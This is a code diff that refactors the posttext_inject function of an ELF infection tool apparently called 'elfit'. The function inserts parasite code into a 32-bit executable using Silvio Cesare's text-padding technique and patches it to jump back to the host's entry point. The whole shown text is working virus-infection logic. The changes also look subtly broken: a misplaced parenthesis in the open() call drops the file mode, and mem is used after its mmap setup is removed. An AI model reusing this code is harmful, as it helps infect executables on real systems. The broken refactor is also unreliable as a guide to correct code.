@@ -1,9 +1,5 @@
 #include "elfit.h"
 
-int hfd, pfd;
-int patch_position;
-struct stat hst, pst;
-
 /* Inject parasite code into an 
  * executable using Silvio Cesare's 
  * post text padding technique 
@@ -11,14 +7,16 @@ struct stat hst, pst;
  * @param parasite filename containing the parasite
  * @param patch_position position in the parasite code to insert the host's code address
  */
-int posttext_inject(char *host, char *parasite, uint8_t patch_position)
+int posttext_inject(unsigned char *host, struct stat *hst, 
+                        char *parasite, uint8_t patch_position)
 {
     unsigned long entry_point, text_offset, text_begin;
     unsigned char *mem;
     unsigned int entry_offset;
     unsigned char buf[PAGE_SIZE];
     unsigned int ehdr_size;
-    int ofd;
+    struct stat pst;
+    int pfd, ofd;
     int psize;
     int text_found;
     Elf32_Ehdr *ehdr;
@@ -26,39 +24,19 @@ int posttext_inject(char *host, char *parasite, uint8_t patch_position)
     Elf32_Shdr *shdr;
     int i, wrote;
 
-    if ((hfd = open(host, O_RDONLY)) == -1) 
-    {
-        perror("host open");
-        exit(-1);
-    }
-
     if ((pfd = open(parasite, O_RDONLY)) == -1)
     {
         perror("parasite open");
         exit(-1);
     }
 
-    if (fstat(hfd, &hst))
-    {
-        perror("host stat");
-        exit(-1);
-    }
-     
     if (fstat(pfd, &pst))
     {
         perror("parasite stat");
         exit(-1);
     }
 
-
     psize = pst.st_size;
-
-    mem = mmap(NULL, hst.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, hfd, 0);
-    if (mem == MAP_FAILED)
-    {
-        perror("mmap");
-        exit(-1);
-    }
 
     ehdr = (Elf32_Ehdr *) mem;
     entry_point = ehdr->e_entry;
@@ -125,7 +103,7 @@ int posttext_inject(char *host, char *parasite, uint8_t patch_position)
     *(unsigned long *)&buf[patch_position] = entry_point;
     printf("Patching parasite to jmp to %x\n", entry_point);
 
-    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, hst.st_mode)) == -1)
+    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC), hst->st_size) == -1)
     {
         perror("tmp binary: open");
         exit(-1);
@@ -151,7 +129,7 @@ int posttext_inject(char *host, char *parasite, uint8_t patch_position)
     }
 
     mem += text_offset + entry_offset;
-    if (write(ofd, mem, hst.st_size-preparasite_size_file) != hst.st_size-preparasite_size_file)
+    if (write(ofd, mem, hst->st_size-preparasite_size_file) != hst->st_size-preparasite_size_file)
     {
         perror("tmp binary: write post injection");
         exit(-1);
